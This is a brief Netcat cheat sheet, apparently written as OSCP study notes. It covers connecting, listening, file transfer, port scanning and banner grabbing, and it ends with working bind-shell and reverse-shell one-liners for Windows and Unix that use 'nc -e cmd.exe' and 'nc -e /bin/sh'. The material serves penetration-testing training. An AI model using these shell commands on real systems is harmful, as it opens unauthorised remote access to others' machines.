---
title:  "Netcat Cheat Sheet"
header: "Netcat Cheat Sheet"
categories: 
  - Cheatsheet
  - OSCP
tags:
  - Netcat
---

Netcat which has been famously labeled as the "Swiss army knife of hacking" is a networking utility used for reading/writing from TCP/UDP sockets, port scanning, file transfer, port listening, and backdooring.

# Usage
***

![Netcat Usage](/assets/images/netcat.JPG)

# Basic Commands  
***
#### TCP Port - Connecting  
`nc -nv <IP> <PORT>`

#### TCP Port - Listening  
`nc -lvp <PORT>`

#### Connect and return HTTP Page  
`nc -nv <IP> 80`
`HEAD / HTTP/1.1`

#### File Transfer  
`nc -lvp 4444 > output.txt # Receiving End`  
`nc -nv <IP> < input.txt # Sending End`

#### Port Scanning  
`nc -z <IP> <PORT RANGE>`

#### Banner Grabbing  
`echo "" | nc -nv -w1 <IP> <PORTS>`

# Windows  
***
#### Bind Shell  
`nc -lvp 4444 -e cmd.exe`  
`nc -nv <IP> 4444`

#### Reverse Shell  
`nc -lvp 443 # Attacker - Receiving`  
`nc -nv <IP> 443 -e cmd.exe # Target - Sending`

# Nix  
***
#### Bind Shell  
`nc -lvp 4444 -e /bin/sh`  
`nc -nv <IP> 4444`

#### Reverse Shell  
`nc -lvp 443`  
`nc -nv <IP> 443 -e /bin/sh`


# Additional Resources  
***
[SANS Netcat Cheat Sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)  

[Wikipedia](https://en.wikipedia.org/wiki/Netcat)
